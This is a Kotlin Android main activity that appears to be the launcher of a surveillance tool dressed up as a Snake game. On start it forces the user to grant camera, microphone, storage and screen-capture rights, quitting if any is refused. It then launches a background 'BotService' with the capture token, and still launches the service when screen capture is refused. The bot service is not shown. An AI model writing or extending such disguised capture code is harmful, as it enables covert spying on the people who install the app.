package com.example.myrootsql

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PERMISSIONS_REQUEST = 100
    private val MEDIA_PROJECTION_REQUEST = 101
    private lateinit var statusText: TextView
    private var mediaProjectionIntent: Intent? = null

    private val requiredPermissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS
        )
    } else {
        arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)
        val snakeBtn = findViewById<Button>(R.id.snakeBtn)
        snakeBtn.setOnClickListener {
            startActivity(Intent(this, SnakeGame::class.java))
        }
        checkPermissions()
    }

    private fun checkPermissions() {
        val missing = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERMISSIONS_REQUEST)
        } else {
            requestMediaProjection()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSIONS_REQUEST) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                requestMediaProjection()
            } else {
                Toast.makeText(this, "Все разрешения обязательны", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun requestMediaProjection() {
        val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            val intent = manager.createScreenCaptureIntent()
            startIntentSenderForResult(
                intent.intentSender,
                MEDIA_PROJECTION_REQUEST,
                null, 0, 0, 0, null
            )
        } catch (e: Exception) {
            Toast.makeText(this, "Ошибка запроса медиа-проекции", Toast.LENGTH_LONG).show()
            startBotService(null)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == MEDIA_PROJECTION_REQUEST) {
            if (resultCode == RESULT_OK && data != null) {
                mediaProjectionIntent = data
                startBotService(mediaProjectionIntent)
            } else {
                Toast.makeText(this, "Медиа-проекция не разрешена", Toast.LENGTH_LONG).show()
                startBotService(null)
            }
        }
    }

    private fun startBotService(mediaProjectionIntent: Intent?) {
        val intent = Intent(this, BotService::class.java)
        mediaProjectionIntent?.let {
            intent.putExtra("mediaProjectionIntent", it)
        }
        startService(intent)
        statusText.text = "Сервис запущен"
        Toast.makeText(this, "Сервис запущен", Toast.LENGTH_SHORT).show()
    }
}